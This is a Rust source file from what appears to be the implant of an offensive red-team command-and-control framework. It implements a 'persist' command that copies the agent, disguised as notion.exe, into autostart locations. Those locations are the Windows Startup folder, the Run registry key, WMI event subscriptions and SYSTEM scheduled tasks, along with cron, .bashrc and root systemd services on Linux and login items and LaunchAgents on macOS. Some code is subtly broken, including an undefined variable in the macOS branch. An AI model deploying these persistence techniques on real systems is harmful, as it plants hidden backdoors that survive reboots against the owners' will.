use std::error::Error;
use std::env::{var, args};
use is_root::is_root;
use crate::cmd::{CommandArgs, shell, save};
#[cfg(not(windows))] use std::fs::{create_dir, copy, write};
#[cfg(windows)] use std::path::Path;
#[cfg(windows)] use winreg::{RegKey};
#[cfg(windows)] use std::fs::copy as fs_copy;
#[cfg(windows)] use winreg::enums::HKEY_CURRENT_USER;
#[cfg(windows)] use std::process::Command;
#[cfg(windows)] use crate::cmd::getprivs::is_elevated;
use crate::config::ConfigOptions;
use crate::logger::Logger;


/// Uses the specified method to establish persistence. 
/// 
/// ### Windows Options
/// 
/// * `startup`: Copies the agent to the Startup Programs folder.
/// * `registry`: Copies the agent to `%LOCALAPPDATA%` and writes a value to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.
/// * `wmic`: Establishes persistences via WMI subscriptions.
/// * `schtasks`: Creates a Schedule Task
/// 
/// ### Linux Options
/// 
/// * `cron`: Writes a cronjob to the user's crontab and saves the agent in the home folder
/// * `systemd`: Creates a systemd service and writes the binary someplace special
pub async fn handle(cmd_args: &mut CommandArgs, config_options: &mut ConfigOptions, logger: &Logger) -> Result<String, Box<dyn Error>> {
    // `persist [method] [args]`
    #[cfg(windows)] {
        match cmd_args.nth(0).unwrap().as_str() {
            "startup" => {
                // Get user
                if let Ok(v) = var("APPDATA") {
                    let mut persist_path: String = v;
                    persist_path.push_str(r"\Microsoft\Windows\Start Menu\Programs\Startup\notion.exe");
                    let exe_path = args().nth(0).unwrap();
                    // let mut out_file = File::create(path).expect("Failed to create file");
                    match fs_copy(&exe_path, &persist_path) {
                        Ok(b)  => { return Ok(format!("{b} bytes written to {persist_path}").to_string());},
                        Err(e) => { return Ok(e.to_string())}
                    }
                } else {
                    return Ok("Couldn't get APPDATA location".to_string());
                };
            },
            "registry" => {
                if let Ok(v) = var("LOCALAPPDATA") {
                    let mut persist_path: String = v;
                    persist_path.push_str(r"\notion.exe");
                    let exe_path = args().nth(0).unwrap();
                    logger.debug(format!("Current exec path: {exe_path}"));
                    // let mut out_file = File::create(path).expect("Failed to create file");
                    fs_copy(&exe_path, &persist_path)?;
                    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
                    let path = Path::new(r"Software\Microsoft\Windows\CurrentVersion\Run");
                    let (key, disp) = hkcu.create_subkey(&path)?;
                    match disp {
                        REG_CREATED_NEW_KEY => logger.info("A new key has been created".to_string()),
                        REG_OPENED_EXISTING_KEY => logger.info("An existing key has been opened".to_string()),
                    };
                    key.set_value("Notion", &persist_path)?;
                    Ok("Persistence accomplished".to_string())
                } else {
                    Ok("LOCALDATA undefined".to_string())
                }
            },
            "wmic" => {
                //Ref: https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/
                //With special thanks to: https://github.com/trickster0/OffensiveRust
                //OPSEC unsafe! Use with caution
                let elevated = is_elevated();
                if elevated {
                    if let Ok(v) = var("LOCALAPPDATA") {
                        let mut persist_path: String = v;
                        persist_path.push_str(r"\notion.exe");
                        let exe_path = args().nth(0).unwrap();
                        match fs_copy(&exe_path, &persist_path) {
                            Ok(_)  => {
                                
                                let encoded_config = config_options.to_base64();
                                let cmds = vec![
                                    format!(r#"$FilterArgs = @{{ name='Notion';EventNameSpace='root\CimV2';QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"}}; $Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs; $ConsumerArgs = @{{ name='Notion';CommandLineTemplate="{persist_path} -b {encoded_config}"; }}; $Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs ; $FilterToConsumerArgs = @{{ Filter = [Ref] $Filter; Consumer = [Ref] $Consumer ;}}; $FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs"#),
                                    ];

                                for c in cmds {
                                    Command::new("powershell.exe")
                                    .arg(c)
                                    .spawn()?;
                                };
                                    
                                let sleep_time = 
                                std::time::Duration::from_secs(2);
                                std::thread::sleep(sleep_time);

                                // Checking the subscriptions:
                                let output = Command::new("powershell.exe")
                                    .arg(r"Get-WMIObject -Namespace root\Subscription -Class __EventFilter ")
                                    .output()
                                    .expect("failed to execute process");
                            
                                    let output_string: String;
                                    if output.stderr.len() > 0 {
                                        output_string = String::from_utf8(output.stderr).unwrap();
                                    } else {
                                        output_string = String::from_utf8(output.stdout).unwrap();
                                    }
                                    return Ok(output_string);
                            },
                            Err(e) => { return Ok(e.to_string())}
                        }
                
                    } else {
                        return Ok("Could not locate APPDATA.".to_string());
                    }
                }
                else{
                    return Ok("[-] WMIC persistence requires admin privileges.".to_string());
                }
            },
            "schtasks" => {
                //Ref: https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/
                //With special thanks to: https://github.com/trickster0/OffensiveRust
                //OPSEC unsafe! Use with caution
                let elevated = is_elevated();
                if elevated {
                    if let Ok(v) = var("LOCALAPPDATA") {
                        let cfg_path = format!("{v}\\cfg.json");
                        let mut cfg_path_args = CommandArgs::from_string(cfg_path.to_owned());
                        save::handle(&mut cfg_path_args, config_options).await?;
                        let mut persist_path: String = v;
                        persist_path.push_str(r"\notion.exe");
                        
                        let exe_path = args().nth(0).unwrap();
                        match fs_copy(&exe_path, &persist_path) {
                            Ok(_)  => {
                                
                                let encoded_config = config_options.to_base64();
                                let schtask_arg = format!(r#" /create /tn Notion /tr "C:\Windows\System32\cmd.exe '{persist_path} -c {cfg_path}'" /sc onlogon /ru System""#);
                                let output = Command::new("schtasks.exe")
                                    .arg("/create")
                                    .arg("/tn")
                                    .arg("Notion")
                                    .arg("/tr")
                                    .arg(format!(r#"{persist_path} -c {cfg_path}"#))
                                    .arg("/sc")
                                    .arg("onlogon")
                                    .arg("/ru")
                                    .arg("System")
                                    .output()
                                    .expect("failed to execute process");
                            
                                    let output_string: String;
                                    if output.stderr.len() > 0 {
                                        output_string = String::from_utf8(output.stderr).unwrap();
                                    } else {
                                        output_string = String::from_utf8(output.stdout).unwrap();
                                    }
                                    return Ok(output_string);
                            },
                            Err(e) => { return Ok(e.to_string())}
                        }
                
                    } else {
                        return Ok("Could not locate APPDATA.".to_string());
                    }
                }
                else{
                    return Ok("[-] Scheduled task persistence requires admin privileges.".to_string());
                }
            },



            _ => Ok("That's not a persistence method!".to_string())
        }
    }

    #[cfg(target_os = "linux")] {

        let app_path = args().nth(0).unwrap();
        let home = var("HOME")?;
        let app_dir = format!("{home}/.notion");
        let dest_path = format!("{app_dir}/notion");

        match cmd_args.nth(0).unwrap_or_default().as_str() {
            "cron"    => {
                // Copy the app to a new folder
                match create_dir(&app_dir) {
                    Ok(_) => { logger.info("Notion directory created".to_string()); },
                    Err(e) => { logger.err(e.to_string()); }
                };
                if let Ok(_) = copy(&app_path, dest_path) {
                    // Save config for relaunch
                    let mut save_args = CommandArgs::from_string(format!("{app_dir}/cfg.json"));
                    save::handle(&mut save_args, config_options).await?;
                    // Write a cronjob to the user's crontab with the given minutes as an interval.
                    let cron_string = format!("0 * * * * {app_dir}/notion");
                    let mut cron_args = CommandArgs::from_string(
                        format!("(crontab -l 2>/dev/null; echo '{cron_string}') | crontab - ")
                    );
                    if let Ok(_) = shell::handle(&mut cron_args).await {
                        Ok("Cronjob added!".to_string())
                    } else {
                        Ok("Could not make cronjob".to_string())
                    }
                } else {
                    Ok("Could not copy app to destination".to_string())
                }
            }
            "bashrc"  => {
                // Copy the app to a new folder
                match create_dir(&app_dir) {
                    Ok(_) => { logger.info("Notion directory created".to_string()); },
                    Err(e) => { logger.err(e.to_string()); }
                };
                if let Ok(_) = copy(&app_path, dest_path) {
                    // Save config for relaunch
                    let b64_config = config_options.to_base64();
                    // Write a line to the user's bashrc that starts the agent.
                    let mut bashrc_args = CommandArgs::new(
                        vec![format!("echo '{app_dir}/notion -b {b64_config} & disown' >> ~/.bashrc ")]
                    );
                    if let Ok(_) = shell::handle(&mut bashrc_args).await {
                        Ok("Bash Backdoored!".to_string())
                    } else {
                        Ok("Could not modify bashrc".to_string())
                    }
                } else {
                    Ok("Could not copy app to destination".to_string())
                }
            },
            "service" => {
                if is_root() {
                    match create_dir(&app_dir) {
                        Ok(_) => { logger.info("Notion directory created".to_string()); },
                        Err(e) => { logger.err(e.to_string()); }
                    };    
                    if let Ok(_) = copy(&app_path, &dest_path) {
                        let b64_config = config_options.to_base64();
                        let svc_path = "/lib/systemd/system/notion.service";
                        let svc_string = format!(
"[Unit]
Description=Notion Service
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=1
User=root
ExecStart={dest_path} -b {b64_config}

[Install]
WantedBy=multi-user.target"
);
                        write(svc_path, svc_string)?;
                        let mut systemd_args = CommandArgs::from_string(
                            "systemctl enable notion.service".to_string()
                        );
                        return shell::handle(&mut systemd_args).await;
                    } else {
                        return Ok("Could not copy service file".to_string());
                    }
                } else {
                    return Ok("Need to be root first. Try elevate.".to_string());
                }
            }, 
            _         => Ok("Unknown persistence method!".to_string())
        }
    }

    #[cfg(target_os = "macos")] {
        let app_path = args().nth(0).unwrap();
        let home = var("HOME")?;
        let app_dir = format!("{home}/.notion");
        let dest_path = format!("{app_dir}/notion");

        match cmd_args.nth(0).unwrap_or_default().as_str() {
            "loginitem" => {
                // Copy the app to a new folder
                match create_dir(&app_dir) {
                    Ok(_) => { logger.info("Notion directory created".to_string()); },
                    Err(e) => { logger.err(e.to_string()); }
                };
                if let Ok(_) = copy(&app_path, dest_path) {
                    // Save config for relaunch
                    let b64_config = config_options.to_base64();
                    // Write a line to the user's bashrc that starts the agent.
                    let mut applescript_args = CommandArgs::new(
                        vec![format!(r#"osascript -e 'tell application "System Events" to make login item at end with properties \{path:"{dest_path}/notion", hidden:true\}'"#)]
                    );
                    if let Ok(_) = shell::handle(&mut bashrc_args).await {
                        Ok("Login item created!".to_string())
                    } else {
                        Ok("Could not create login item".to_string())
                    }
                } else {
                    Ok("Could not copy app to destination".to_string())
                }

            },
            "launchagent" => {
                
                match create_dir(&app_dir) {
                    Ok(_) => { logger.info("Notion directory created".to_string()); },
                    Err(e) => { logger.err(e.to_string()); }
                };    
                if let Ok(_) = copy(&app_path, &dest_path) {
                    let b64_config = config_options.to_base64();
                    let launch_agent_path: String;
                    if is_root() {
                        launch_agent_path = "/Library/LaunchAgents/com.notion.offnote.plist".to_string();
                    } else {
                        launch_agent_path = format!("{home}/Library/LaunchAgents/com.notion.offnote.plist");
                    }
                    let launch_agent_string = format!(
r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.mttaggart.offensivenotion</string>
<key>ProgramArguments</key>
<array>
<string>{dest_path}</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>"#);
                    write(launch_agent_path, launch_agent_string)?;
                    Ok(format!("LaunchAgent written to {launch_agent_path}"));
                } else {
                    return Ok("Could not copy app to destination".to_string());
                }
            },
            _ => Ok("Unknown persistence method!".to_string())
        }

    }
}